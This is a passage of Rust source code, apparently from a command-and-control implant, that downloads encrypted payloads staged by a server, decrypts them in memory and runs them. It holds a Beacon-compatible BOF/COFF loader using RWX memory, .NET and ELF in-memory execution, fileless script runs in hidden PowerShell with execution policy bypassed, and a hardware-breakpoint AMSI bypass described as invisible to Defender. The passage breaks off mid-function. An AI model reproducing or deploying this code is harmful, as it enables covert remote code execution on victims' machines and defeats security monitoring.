//! In-memory execution module — BOF/COFF loader, Execute-Assembly (.NET CLR),
//! and memfd_exec (Linux ELF in-memory).
//!
//! Staging flow: server encrypts binary → cloud → agent downloads → decrypts to RAM → executes.
//! Nothing touches disk.

use std::sync::Arc;
use crate::{s, sb};
use crate::exec::AgentState;
use crate::transport::SharedTransport;

// ══════════════════════════════════════════════════════════════════════════════
// PUBLIC ENTRY POINTS
// ══════════════════════════════════════════════════════════════════════════════

/// Execute a BOF/COFF object file in-memory (Windows only).
pub fn bof_exec(
    _state: &Arc<AgentState>,
    transport: &SharedTransport,
    session_key: &[u8; 32],
    staging_path: &str,
    args: &str,
) -> String {
    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
        Ok(d) => d,
        Err(e) => return e,
    };

    #[cfg(windows)]
    { _bof_exec_windows(&data, args) }

    #[cfg(not(windows))]
    { let _ = (&data, args); "[bof] BOF/COFF execution is Windows-only".to_string() }
}

/// Execute a .NET assembly in-memory via CLR hosting (Windows only).
pub fn assembly_exec(
    _state: &Arc<AgentState>,
    transport: &SharedTransport,
    session_key: &[u8; 32],
    staging_path: &str,
    args: &str,
) -> String {
    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
        Ok(d) => d,
        Err(e) => return e,
    };

    #[cfg(windows)]
    { _assembly_exec_windows(&data, args, false) }

    #[cfg(not(windows))]
    { let _ = (&data, args); "[assembly] Execute-Assembly requires Windows/.NET CLR".to_string() }
}

pub fn assembly_exec_ab(
    _state: &Arc<AgentState>,
    transport: &SharedTransport,
    session_key: &[u8; 32],
    staging_path: &str,
    args: &str,
) -> String {
    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
        Ok(d) => d,
        Err(e) => return e,
    };

    #[cfg(windows)]
    { _assembly_exec_windows(&data, args, true) }

    #[cfg(not(windows))]
    { let _ = (&data, args); "[assembly] Execute-Assembly requires Windows/.NET CLR".to_string() }
}

/// Execute an ELF binary in-memory via memfd_create (Linux only).
pub fn memexec(
    _state: &Arc<AgentState>,
    transport: &SharedTransport,
    session_key: &[u8; 32],
    staging_path: &str,
    args: &str,
) -> String {
    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
        Ok(d) => d,
        Err(e) => return e,
    };

    #[cfg(target_os = "linux")]
    { _memexec_linux(&data, args) }

    #[cfg(windows)]
    { _memexec_windows(&data, args) }

    #[cfg(not(any(target_os = "linux", windows)))]
    { let _ = (&data, args); "[memexec] Unsupported OS".to_string() }
}

/// Execute a script fileless — pipe to interpreter stdin (cross-platform).
pub fn script_exec(
    _state: &Arc<AgentState>,
    transport: &SharedTransport,
    session_key: &[u8; 32],
    staging_path: &str,
    args: &str,
) -> String {
    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
        Ok(d) => d,
        Err(e) => return e,
    };
    _script_exec_impl(&data, args, false)
}

/// Execute a script fileless with AMSI bypass (Windows only — patches AmsiScanBuffer before spawning PS).
pub fn script_exec_ab(
    _state: &Arc<AgentState>,
    transport: &SharedTransport,
    session_key: &[u8; 32],
    staging_path: &str,
    args: &str,
) -> String {
    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
        Ok(d) => d,
        Err(e) => return e,
    };

    #[cfg(windows)]
    { _script_exec_impl(&data, args, true) }

    #[cfg(not(windows))]
    { let _ = args; _script_exec_impl(&data, "", false) }
}

// ══════════════════════════════════════════════════════════════════════════════
// SHARED: fetch + decrypt staged binary
// ══════════════════════════════════════════════════════════════════════════════

fn _fetch_staged_v2(
    state: &Arc<AgentState>,
    transport: &SharedTransport,
    staging_path: &str,
    _session_key: &[u8; 32],
) -> Result<Vec<u8>, String> {
    crate::dlog!("stage", "downloading {}", staging_path);
    let enc_data = transport.download(staging_path)
        .ok_or_else(|| "[error] Failed to download staged binary from cloud".to_string())?;
    if enc_data.is_empty() {
        return Err("[error] Staged file is empty".to_string());
    }
    let ek = state.epoch_key.lock().unwrap();
    let data = ek.as_ref()
        .and_then(|k| crate::crypto::decrypt_staging(&enc_data, k))
        .ok_or_else(|| "[error] Staging decryption failed".to_string())?;
    crate::dlog!("stage", "decrypted OK, {} bytes plaintext", data.len());
    Ok(data)
}

// ══════════════════════════════════════════════════════════════════════════════
// SCRIPT EXEC — fileless pipe-to-stdin execution
// ══════════════════════════════════════════════════════════════════════════════

fn _script_exec_impl(script_bytes: &[u8], args: &str, amsi_bypass: bool) -> String {
    use std::io::Write;
    use std::process::{Command, Stdio};

    const CMD_TIMEOUT_SECS: u64 = 120;
    const MAX_OUTPUT_BYTES: usize = 4 * 1024 * 1024;

    let script_str = String::from_utf8_lossy(script_bytes);
    let first_line = script_str.lines().next().unwrap_or("");

    // Detect interpreter from args hint or shebang
    #[derive(PartialEq)]
    enum Interp { Powershell, Cmd, Bash, Python, Sh }
    let interp = {
        let a = args.trim().to_lowercase();
        if a == "ps1" || a == "powershell" { Interp::Powershell }
        else if a == "cmd" || a == "bat" { Interp::Cmd }
        else if a == "python" || a == "py" { Interp::Python }
        else if a == "bash" { Interp::Bash }
        else if a == "sh" { Interp::Sh }
        else if first_line.starts_with("#!") {
            if first_line.contains("python") { Interp::Python }
            else if first_line.contains("bash") { Interp::Bash }
            else { Interp::Sh }
        } else {
            #[cfg(windows)] { Interp::Powershell }
            #[cfg(not(windows))] { Interp::Sh }
        }
    };

    #[cfg(windows)]
    let amsi_hwbp: Option<AmsiHwbp> = if amsi_bypass && interp == Interp::Powershell {
        let bp = _amsi_hwbp_install();
        if bp.is_some() { crate::dlog!("script", "AMSI bypass: HW breakpoint set on AmsiScanBuffer"); }
        bp
    } else { None };

    #[cfg(not(windows))]
    let _ = amsi_bypass;

    let spawn_result = {
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            match interp {
                Interp::Powershell => {
                    Command::new(s!("powershell"))
                        .args(&[
                            s!("-NoProfile"), s!("-NonInteractive"),
                            s!("-WindowStyle"), s!("Hidden"),
                            s!("-ExecutionPolicy"), s!("Bypass"),
                            s!("-Command"), s!("-"),
                        ])
                        .stdin(Stdio::piped())
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .creation_flags(0x0800_0000)
                        .spawn()
                }
                Interp::Cmd => {
                    Command::new(s!("cmd"))
                        .args(&[s!("/c"), s!("more")])
                        .stdin(Stdio::piped())
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .creation_flags(0x0800_0000)
                        .spawn()
                }
                _ => {
                    return "[script] Bash/Python/Sh interpreters are Linux-only".to_string();
                }
            }
        }
        #[cfg(not(windows))]
        {
            match interp {
                Interp::Bash => {
                    Command::new("/bin/bash")
                        .args(&["-s", "--"])
                        .stdin(Stdio::piped())
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .spawn()
                }
                Interp::Python => {
                    Command::new("python3")
                        .args(&["-"])
                        .stdin(Stdio::piped())
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .spawn()
                }
                Interp::Sh => {
                    Command::new("/bin/sh")
                        .args(&["-s", "--"])
                        .stdin(Stdio::piped())
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .spawn()
                }
                _ => {
                    return "[script] PowerShell/CMD interpreters are Windows-only".to_string();
                }
            }
        }
    };

    let mut child = match spawn_result {
        Ok(c) => c,
        Err(e) => {
            #[cfg(windows)]
            if let Some(bp) = amsi_hwbp { _amsi_hwbp_remove(bp); }
            return format!("[script] Failed to spawn interpreter: {}", e);
        }
    };

    // Write script to child stdin in a separate thread to avoid deadlock
    let script_owned = script_bytes.to_vec();
    let mut stdin = child.stdin.take().expect("stdin piped");
    let writer = std::thread::spawn(move || {
        let _ = stdin.write_all(&script_owned);
        drop(stdin);
    });

    // Wait with timeout
    let (pid_tx, pid_rx) = std::sync::mpsc::channel::<()>();
    let (out_tx, out_rx) = std::sync::mpsc::channel::<Result<std::process::Output, std::io::Error>>();
    std::thread::spawn(move || {
        let _ = pid_tx.send(());
        let _ = writer.join();
        let _ = out_tx.send(child.wait_with_output());
    });
    let _ = pid_rx.recv();

    let result = match out_rx.recv_timeout(std::time::Duration::from_secs(CMD_TIMEOUT_SECS)) {
        Ok(Ok(out)) => {
            let stdout = &out.stdout[..out.stdout.len().min(MAX_OUTPUT_BYTES)];
            let mut s = String::from_utf8_lossy(stdout).to_string();
            let remaining = MAX_OUTPUT_BYTES.saturating_sub(s.len());
            if remaining > 0 {
                let err = String::from_utf8_lossy(&out.stderr[..out.stderr.len().min(remaining)]).to_string();
                if !err.is_empty() { s.push_str(&err); }
            }
            if s.len() >= MAX_OUTPUT_BYTES {
                s.push_str("\n[TRUNCATED: output exceeded 4 MB]");
            }
            if s.is_empty() { s = format!("[exit code: {}]", out.status.code().unwrap_or(-1)); }
            s
        }
        Ok(Err(e)) => format!("[script] Execution error: {}", e),
        Err(_) => "[script] Execution timed out (120s)".to_string(),
    };

    #[cfg(windows)]
    if let Some(bp) = amsi_hwbp {
        _amsi_hwbp_remove(bp);
        crate::dlog!("script", "AMSI bypass: HW breakpoint removed");
    }

    result
}

// ══════════════════════════════════════════════════════════════════════════════
// AMSI BYPASS — Hardware Breakpoint + Vectored Exception Handler
// ══════════════════════════════════════════════════════════════════════════════
//
// Sets a CPU debug breakpoint (DR0) on AmsiScanBuffer.  When AMSI invokes it,
// the CPU raises EXCEPTION_SINGLE_STEP; our VEH intercepts, sets RAX to
// E_INVALIDARG and skips the function body.  Zero VirtualProtect, zero memory
// writes on amsi.dll — invisible to Defender Behavior:Win32/AMSI_Patch_T.

#[cfg(windows)]
struct AmsiHwbp {
    veh_handle: *mut std::ffi::c_void,
}

#[cfg(windows)]
unsafe impl Send for AmsiHwbp {}

#[cfg(windows)]
static AMSI_SCAN_BUF_ADDR: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

#[cfg(windows)]
unsafe extern "system" fn _amsi_veh_handler(exception_info: *mut u8) -> i32 {
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
    const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;

    // EXCEPTION_POINTERS layout: *EXCEPTION_RECORD, *CONTEXT
    let exception_record = *(exception_info as *const *const u8);
    let context_ptr = *((exception_info as *const *mut u8).add(1));

    // EXCEPTION_RECORD: ExceptionCode is first DWORD
    let code = *(exception_record as *const u32);
    if code != EXCEPTION_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // x86_64 CONTEXT offsets (CONTEXT_AMD64):
    //   0x030: ContextFlags (DWORD)
    //   0x048: Dr0  (u64)
    //   0x050: Dr1  (u64)
    //   0x058: Dr2  (u64)
    //   0x060: Dr3  (u64)
    //   0x068: Dr6  (u64)
    //   0x070: Dr7  (u64)
    //   0x078: Rax  (u64)
    //   0x098: Rsp  (u64)
    //   0x0F8: Rip  (u64)
    let rip = *((context_ptr.add(0xF8)) as *const u64);
    let target = AMSI_SCAN_BUF_ADDR.load(std::sync::atomic::Ordering::Relaxed) as u64;
    if target == 0 || rip != target {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Set RAX = E_INVALIDARG (0x80070057) — AMSI_RESULT_CLEAN path
    *((context_ptr.add(0x78)) as *mut u64) = 0x80070057u64;

    // Set RIP to return address: dereference RSP (top of stack = return addr)
    let rsp = *((context_ptr.add(0x98)) as *const u64);
    let ret_addr = *(rsp as *const u64);
    *((context_ptr.add(0xF8)) as *mut u64) = ret_addr;

    // Advance RSP past the return address (simulate ret)
    *((context_ptr.add(0x98)) as *mut u64) = rsp + 8;

    // Clear DR0 so the breakpoint doesn't re-fire on next call
    // (we re-arm per install, not per call)
    // Actually: leave DR0 set so repeated AmsiScanBuffer calls are also caught

    EXCEPTION_CONTINUE_EXECUTION
}

#[cfg(windows)]
fn _amsi_hwbp_install() -> Option<AmsiHwbp> {
    unsafe {
        let amsi_name = sb!("amsi.dll");
        let amsi_mod = crate::dynapi::load_library_a(amsi_name.as_ptr()) as *mut std::ffi::c_void;
        if amsi_mod.is_null() { return None; }

        let scan_name = sb!("AmsiScanBuffer");
        let scan_addr = crate::dynapi::get_proc_address(amsi_mod, scan_name.as_ptr()) as usize;
        if scan_addr == 0 { return None; }

        AMSI_SCAN_BUF_ADDR.store(scan_addr, std::sync::atomic::Ordering::SeqCst);

        let veh = crate::dynapi::add_vectored_exception_handler(1, _amsi_veh_handler);
        if veh.is_null() { return None; }

        // CONTEXT size for x86_64: 1232 bytes, must be 16-byte aligned
        let mut ctx_buf = vec![0u8; 1232];
        let ctx = ctx_buf.as_mut_ptr();

        // ContextFlags = CONTEXT_DEBUG_REGISTERS (0x00100010)
        *(ctx.add(0x30) as *mut u32) = 0x0010_0010;

        // -2 is pseudo-handle for current thread
        if crate::dynapi::get_thread_context(-2isize, ctx) == 0 {
            crate::dynapi::remove_vectored_exception_handler(veh);
            return None;
        }

        // DR0 = AmsiScanBuffer address
        *(ctx.add(0x48) as *mut u64) = scan_addr as u64;

        // DR7: enable DR0 local breakpoint (bit 0 = 1), execute-on-access (bits 16-17 = 00)
        let mut dr7 = *(ctx.add(0x70) as *const u64);
        dr7 |= 1; // L0 = local enable for DR0
        // Condition for DR0 (bits 16-17): 00 = execution breakpoint (already default)
        // Length for DR0 (bits 18-19): 00 = 1-byte (required for exec BP)
        dr7 &= !(0xFu64 << 16); // clear condition+length bits for DR0
        *(ctx.add(0x70) as *mut u64) = dr7;

        if crate::dynapi::set_thread_context(-2isize, ctx) == 0 {
            crate::dynapi::remove_vectored_exception_handler(veh);
            return None;
        }

        Some(AmsiHwbp { veh_handle: veh })
    }
}

#[cfg(windows)]
fn _amsi_hwbp_remove(bp: AmsiHwbp) {
    unsafe {
        // Clear DR0 and DR7 local-enable bit
        let mut ctx_buf = vec![0u8; 1232];
        let ctx = ctx_buf.as_mut_ptr();
        *(ctx.add(0x30) as *mut u32) = 0x0010_0010;
        if crate::dynapi::get_thread_context(-2isize, ctx) != 0 {
            *(ctx.add(0x48) as *mut u64) = 0; // DR0 = 0
            let mut dr7 = *(ctx.add(0x70) as *const u64);
            dr7 &= !1u64; // clear L0
            *(ctx.add(0x70) as *mut u64) = dr7;
            crate::dynapi::set_thread_context(-2isize, ctx);
        }

        crate::dynapi::remove_vectored_exception_handler(bp.veh_handle);
        AMSI_SCAN_BUF_ADDR.store(0, std::sync::atomic::Ordering::SeqCst);
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// BEACON COMPATIBILITY API — C-ABI shims matching beacon.h structs
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(windows)]
mod beacon_api {
    #[repr(C)]
    pub struct DataP {
        pub original: *const u8,
        pub buffer:   *const u8,
        pub length:   i32,
        pub size:     i32,
    }

    #[repr(C)]
    pub struct FormatP {
        pub original: *mut u8,
        pub buffer:   *mut u8,
        pub length:   i32,
        pub size:     i32,
    }

    pub static mut BEACON_BUF: *const std::sync::Mutex<Vec<u8>> = std::ptr::null();

    pub unsafe extern "C" fn beacon_printf(_ty: i32, fmt: *const u8) {
        if fmt.is_null() { return; }
        let s = std::ffi::CStr::from_ptr(fmt as *const i8);
        if let Ok(mut g) = (*BEACON_BUF).lock() { g.extend_from_slice(s.to_bytes()); g.push(b'\n'); }
    }

    pub unsafe extern "C" fn beacon_output(_ty: i32, data: *const u8, len: i32) {
        if data.is_null() || len <= 0 { return; }
        let sl = std::slice::from_raw_parts(data, len as usize);
        if let Ok(mut g) = (*BEACON_BUF).lock() { g.extend_from_slice(sl); }
    }

    pub unsafe extern "C" fn beacon_data_parse(dp: *mut DataP, buf: *const u8, size: i32) {
        if dp.is_null() { return; }
        (*dp).original = buf;
        (*dp).buffer   = buf;
        (*dp).length   = size;
        (*dp).size     = size;
    }

    pub unsafe extern "C" fn beacon_data_int(dp: *mut DataP) -> i32 {
        if dp.is_null() || (*dp).length < 4 { return 0; }
        let p = (*dp).buffer;
        let v = i32::from_be_bytes([*p, *p.add(1), *p.add(2), *p.add(3)]);
        (*dp).buffer = (*dp).buffer.add(4);
        (*dp).length -= 4;
        v
    }

    pub unsafe extern "C" fn beacon_data_short(dp: *mut DataP) -> i16 {
        if dp.is_null() || (*dp).length < 2 { return 0; }
        let p = (*dp).buffer;
        let v = i16::from_be_bytes([*p, *p.add(1)]);
        (*dp).buffer = (*dp).buffer.add(2);
        (*dp).length -= 2;
        v
    }

    pub unsafe extern "C" fn beacon_data_length(dp: *mut DataP) -> i32 {
        if dp.is_null() { return 0; }
        (*dp).length
    }

    pub unsafe extern "C" fn beacon_data_extract(dp: *mut DataP, size: *mut i32) -> *const u8 {
        if dp.is_null() || (*dp).length < 4 { return std::ptr::null(); }
        let len = beacon_data_int(dp);
        if len <= 0 || len > (*dp).length { return std::ptr::null(); }
        let ptr = (*dp).buffer;
        (*dp).buffer = (*dp).buffer.add(len as usize);
        (*dp).length -= len;
        if !size.is_null() { *size = len; }
        ptr
    }

    pub unsafe extern "C" fn beacon_format_alloc(fp: *mut FormatP, maxsz: i32) {
        if fp.is_null() { return; }
        let layout = std::alloc::Layout::from_size_align(maxsz as usize, 1).unwrap();
        let buf = std::alloc::alloc_zeroed(layout);
        (*fp).original = buf;
        (*fp).buffer   = buf;
        (*fp).length   = 0;
        (*fp).size     = maxsz;
    }

    pub unsafe extern "C" fn beacon_format_free(fp: *mut FormatP) {
        if fp.is_null() || (*fp).original.is_null() { return; }
        let layout = std::alloc::Layout::from_size_align((*fp).size as usize, 1).unwrap();
        std::alloc::dealloc((*fp).original, layout);
        (*fp).original = std::ptr::null_mut();
        (*fp).buffer   = std::ptr::null_mut();
        (*fp).length   = 0;
        (*fp).size     = 0;
    }

    pub unsafe extern "C" fn beacon_format_append(fp: *mut FormatP, data: *const u8, len: i32) {
        if fp.is_null() || data.is_null() || len <= 0 { return; }
        let avail = (*fp).size - (*fp).length;
        if len > avail { return; }
        std::ptr::copy_nonoverlapping(data, (*fp).buffer, len as usize);
        (*fp).buffer = (*fp).buffer.add(len as usize);
        (*fp).length += len;
    }

    pub unsafe extern "C" fn beacon_format_printf(fp: *mut FormatP, fmt: *const u8) {
        if fp.is_null() || fmt.is_null() { return; }
        let s = std::ffi::CStr::from_ptr(fmt as *const i8);
        let b = s.to_bytes();
        beacon_format_append(fp, b.as_ptr(), b.len() as i32);
    }

    pub unsafe extern "C" fn beacon_format_to_string(fp: *mut FormatP, size: *mut i32) -> *const u8 {
        if fp.is_null() { return std::ptr::null(); }
        if !size.is_null() { *size = (*fp).length; }
        (*fp).original as *const u8
    }

    pub unsafe extern "C" fn beacon_format_int(fp: *mut FormatP, val: i32) {
        let bytes = val.to_be_bytes();
        beacon_format_append(fp, bytes.as_ptr(), 4);
    }

    pub unsafe extern "C" fn beacon_format_reset(fp: *mut FormatP) {
        if fp.is_null() { return; }
        (*fp).buffer = (*fp).original;
        (*fp).length = 0;
    }

    pub unsafe extern "C" fn beacon_is_admin() -> i32 {
        use windows_sys::Win32::Security::{CheckTokenMembership, CreateWellKnownSid};
        use windows_sys::Win32::Security::WinBuiltinAdministratorsSid;
        let mut sid = [0u8; 68];
        let mut sid_len: u32 = 68;
        if CreateWellKnownSid(WinBuiltinAdministratorsSid, std::ptr::null_mut(), sid.as_mut_ptr() as _, &mut sid_len) == 0 {
            return 0;
        }
        let mut is_member: i32 = 0;
        if CheckTokenMembership(0, sid.as_ptr() as _, &mut is_member) == 0 {
            return 0;
        }
        is_member
    }

    pub unsafe extern "C" fn beacon_get_spawn_to(x86: i32, buf: *mut u8, maxlen: i32) {
        if buf.is_null() || maxlen <= 0 { return; }
        let path = if x86 != 0 {
            b"C:\\Windows\\SysWOW64\\rundll32.exe\0"
        } else {
            b"C:\\Windows\\System32\\rundll32.exe\0"
        };
        let copy_len = std::cmp::min(path.len(), maxlen as usize);
        std::ptr::copy_nonoverlapping(path.as_ptr(), buf, copy_len);
    }

    pub unsafe extern "C" fn to_wide_char(src: *const u8, dst: *mut u16, max_chars: i32) -> i32 {
        if src.is_null() || dst.is_null() || max_chars <= 0 { return 0; }
        let s = std::ffi::CStr::from_ptr(src as *const i8);
        let bytes = s.to_bytes();
        let limit = (max_chars - 1) as usize;
        let mut i = 0usize;
        for &b in bytes.iter().take(limit) {
            *dst.add(i) = b as u16;
            i += 1;
        }
        *dst.add(i) = 0;
        i as i32
    }

    pub fn register_all(resolved: &mut std::collections::HashMap<String, usize>, got: &mut Vec<Box<usize>>) {
        macro_rules! reg {
            ($map:expr, $name:literal, $fn:expr) => {{
                let addr = $fn as usize;
                let n = crate::s!($name);
                let imp = format!("__imp_{}", &n);
                $map.insert(n, addr);
                let slot = Box::new(addr);
                let slot_addr = &*slot as *const usize as usize;
                got.push(slot);
                $map.insert(imp, slot_addr);
            }};
        }
        reg!(resolved, "BeaconPrintf",         beacon_printf);
        reg!(resolved, "BeaconOutput",         beacon_output);
        reg!(resolved, "BeaconDataParse",      beacon_data_parse);
        reg!(resolved, "BeaconDataInt",        beacon_data_int);
        reg!(resolved, "BeaconDataShort",      beacon_data_short);
        reg!(resolved, "BeaconDataLength",     beacon_data_length);
        reg!(resolved, "BeaconDataExtract",    beacon_data_extract);
        reg!(resolved, "BeaconFormatAlloc",    beacon_format_alloc);
        reg!(resolved, "BeaconFormatFree",     beacon_format_free);
        reg!(resolved, "BeaconFormatAppend",   beacon_format_append);
        reg!(resolved, "BeaconFormatPrintf",   beacon_format_printf);
        reg!(resolved, "BeaconFormatToString", beacon_format_to_string);
        reg!(resolved, "BeaconFormatInt",      beacon_format_int);
        reg!(resolved, "BeaconFormatReset",    beacon_format_reset);
        reg!(resolved, "BeaconIsAdmin",        beacon_is_admin);
        reg!(resolved, "BeaconGetSpawnTo",     beacon_get_spawn_to);
        reg!(resolved, "toWideChar",           to_wide_char);
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// BOF/COFF LOADER — Windows
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(windows)]
fn _bof_exec_windows(coff_data: &[u8], args: &str) -> String {
    use std::collections::HashMap;

    crate::dlog!("bof", "entry, coff_data.len={} args={:?}", coff_data.len(), args);

    if coff_data.len() < 20 {
        return "[bof] Invalid COFF: too small".to_string();
    }

    let machine      = u16::from_le_bytes([coff_data[0], coff_data[1]]);
    let num_sections = u16::from_le_bytes([coff_data[2], coff_data[3]]) as usize;
    let symtab_off   = u32::from_le_bytes([coff_data[8], coff_data[9], coff_data[10], coff_data[11]]) as usize;
    let num_symbols  = u32::from_le_bytes([coff_data[12], coff_data[13], coff_data[14], coff_data[15]]) as usize;
    let opt_hdr_size = u16::from_le_bytes([coff_data[16], coff_data[17]]) as usize;

    crate::dlog!("bof", "machine=0x{:04x} sections={} symbols={} symtab_off={}", machine, num_sections, num_symbols, symtab_off);

    if machine != 0x8664 {
        return format!("[bof] Unsupported machine type: 0x{:04x} (need AMD64)", machine);
    }

    let sections_off = 20 + opt_hdr_size;
    let strtab_off = symtab_off + num_symbols * 18;

    // Parse section headers
    struct Sec { _name: String, vsize: u32, raw_off: usize, raw_sz: usize, reloc_off: usize, nreloc: usize, chars: u32 }
    let mut sections: Vec<Sec> = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let o = sections_off + i * 40;
        if o + 40 > coff_data.len() { return "[bof] Section header OOB".to_string(); }
        let name_bytes = &coff_data[o..o+8];
        let name = if name_bytes[0] == b'/' {
            let s = std::str::from_utf8(&name_bytes[1..]).unwrap_or("").trim_end_matches('\0');
            let so: usize = s.parse().unwrap_or(0);
            _coff_strtab(coff_data, strtab_off + so)
        } else {
            let end = name_bytes.iter().position(|&b| b == 0).unwrap_or(8);
            String::from_utf8_lossy(&name_bytes[..end]).to_string()
        };
        sections.push(Sec {
            _name: name,
            vsize:     u32::from_le_bytes([coff_data[o+8], coff_data[o+9], coff_data[o+10], coff_data[o+11]]),
            raw_sz:    u32::from_le_bytes([coff_data[o+16], coff_data[o+17], coff_data[o+18], coff_data[o+19]]) as usize,
            raw_off:   u32::from_le_bytes([coff_data[o+20], coff_data[o+21], coff_data[o+22], coff_data[o+23]]) as usize,
            reloc_off: u32::from_le_bytes([coff_data[o+24], coff_data[o+25], coff_data[o+26], coff_data[o+27]]) as usize,
            nreloc:    u16::from_le_bytes([coff_data[o+32], coff_data[o+33]]) as usize,
            chars:     u32::from_le_bytes([coff_data[o+36], coff_data[o+37], coff_data[o+38], coff_data[o+39]]),
        });
    }

    // ── Allocate sections via VirtualAlloc (RWX, MEM_TOP_DOWN) ──
    // All sections + GOT + thunks in a single contiguous block so REL32 stays < ±2GB.
    // Layout: [sec0 | sec1 | ... | secN | GOT_slots | thunk_stubs ]
    //
    // GOT: for __imp_ symbols — slot holds function address, relocation target = slot addr
    // Thunks: for direct call symbols — 14-byte `jmp [rip+0]; .quad addr` stubs
    //         the relocation target = thunk addr (executable code)
    let mut sec_sizes: Vec<usize> = Vec::with_capacity(num_sections);
    let mut sec_aligns: Vec<usize> = Vec::with_capacity(num_sections);
    let mut total_relocs = 0usize;
    for sec in &sections {
        let sz = if sec.raw_sz > 0 { sec.raw_sz } else { (sec.vsize as usize).min(1024 * 1024).max(64) };
        sec_sizes.push(sz);
        // Alignment from characteristics: bits 20-23 encode 2^(n-1)
        let align_bits = ((sec.chars >> 20) & 0xF) as u32;
        let align = if align_bits > 0 { 1usize << (align_bits - 1) } else { 1 };
        sec_aligns.push(align);
        total_relocs += sec.nreloc;
    }
    let ext_capacity = total_relocs + 64;
    let got_bytes = ext_capacity * 8;
    let thunk_bytes = ext_capacity * 16;
    // Compute total layout with per-section alignment
    let mut sec_offsets: Vec<usize> = Vec::with_capacity(num_sections);
    let mut cursor = 0usize;
    for i in 0..num_sections {
        let a = sec_aligns[i];
        cursor = (cursor + a - 1) & !(a - 1); // align up
        sec_offsets.push(cursor);
        cursor += sec_sizes[i];
    }
    let got_offset = (cursor + 7) & !7;
    let thunk_offset = got_offset + got_bytes;
    let total_size = thunk_offset + thunk_bytes;

    let arena = unsafe {
        crate::dynapi::virtual_alloc(
            std::ptr::null(), total_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
        ) as *mut u8
    };
    if arena.is_null() {
        return "[bof] VirtualAlloc failed for section arena".to_string();
    }
    unsafe { core::ptr::write_bytes(arena, 0, total_size); }

    // Build per-section pointers into the arena (aligned)
    let mut sec_ptrs: Vec<*mut u8> = Vec::with_capacity(num_sections);
    for (i, sec) in sections.iter().enumerate() {
        let ptr = unsafe { arena.add(sec_offsets[i]) };
        sec_ptrs.push(ptr);
        if sec.raw_sz > 0 && sec.raw_off + sec.raw_sz <= coff_data.len() {
            unsafe { core::ptr::copy_nonoverlapping(coff_data.as_ptr().add(sec.raw_off), ptr, sec.raw_sz); }
        }
        crate::dlog!("bof", "section '{}' raw_sz={} alloc={} align={} at 0x{:x} chars=0x{:x}",
            sec._name, sec.raw_sz, sec_sizes[i], sec_aligns[i], ptr as usize, sec.chars);
    }

    // GOT: pointer slots for __imp_ indirection
    let got_base = unsafe { arena.add(got_offset) } as *mut usize;
    let mut got_count: usize = 0;

    // Thunks: executable jmp stubs for direct calls
    let thunk_base = unsafe { arena.add(thunk_offset) };
    let mut thunk_count: usize = 0;

    crate::dlog!("bof", "GOT at 0x{:x}, thunks at 0x{:x}, capacity={}",
        got_base as usize, thunk_base as usize, ext_capacity);

    // Parse symbols — indexed by COFF symbol index (which counts AUX entries)
    struct Sym { name: String, value: u32, sec_num: i16, class: u8 }
    let mut symbols: HashMap<usize, Sym> = HashMap::with_capacity(num_symbols);
    let mut si = 0usize;
    while si < num_symbols {
        let o = symtab_off + si * 18;
        if o + 18 > coff_data.len() { break; }
        let name = if coff_data[o..o+4] == [0,0,0,0] {
            let so = u32::from_le_bytes([coff_data[o+4], coff_data[o+5], coff_data[o+6], coff_data[o+7]]) as usize;
            _coff_strtab(coff_data, strtab_off + so)
        } else {
            let end = coff_data[o..o+8].iter().position(|&b| b == 0).unwrap_or(8);
            String::from_utf8_lossy(&coff_data[o..o+end]).to_string()
        };
        let num_aux = coff_data[o+17] as usize;
        symbols.insert(si, Sym {
            name,
            value:   u32::from_le_bytes([coff_data[o+8], coff_data[o+9], coff_data[o+10], coff_data[o+11]]),
            sec_num: i16::from_le_bytes([coff_data[o+12], coff_data[o+13]]),
            class:   coff_data[o+16],
        });
        si += 1 + num_aux;
    }

    // Helper: allocate a GOT slot (for __imp_ indirection)
    // Stores func_addr in the slot, returns the slot's own address.
    let mut got_alloc_slot = |func_addr: usize| -> usize {
        if got_count >= ext_capacity { return func_addr; }
        unsafe { *got_base.add(got_count) = func_addr; }
        let slot_addr = unsafe { got_base.add(got_count) } as usize;
        got_count += 1;
        slot_addr
    };

    // Helper: allocate a thunk stub (for direct call/jmp)
    // Writes: ff 25 00 00 00 00 = jmp [rip+0], followed by 8-byte absolute address.
    // Returns the thunk's address (executable code in the arena).
    let mut thunk_alloc = |func_addr: usize| -> usize {
        if thunk_count >= ext_capacity { return func_addr; }
        let stub = unsafe { thunk_base.add(thunk_count * 16) };
        unsafe {
            *stub.add(0) = 0xFF;       // jmp [rip+0]
            *stub.add(1) = 0x25;
            *(stub.add(2) as *mut u32) = 0;
            *(stub.add(6) as *mut usize) = func_addr;
        }
        thunk_count += 1;
        stub as usize
    };

    // Resolve externals:
    //   __imp_X  → GOT slot (pointer-to-pointer indirection, for `call [rip+off]`)
    //   X        → thunk stub (executable jmp, for `call rip+off`)
    let mut resolved: HashMap<String, usize> = HashMap::new();

    let output_buf = Arc::new(std::sync::Mutex::new(Vec::<u8>::new()));
    unsafe { beacon_api::BEACON_BUF = Arc::as_ptr(&output_buf); }

    // Register Beacon API functions
    {
        macro_rules! reg_beacon {
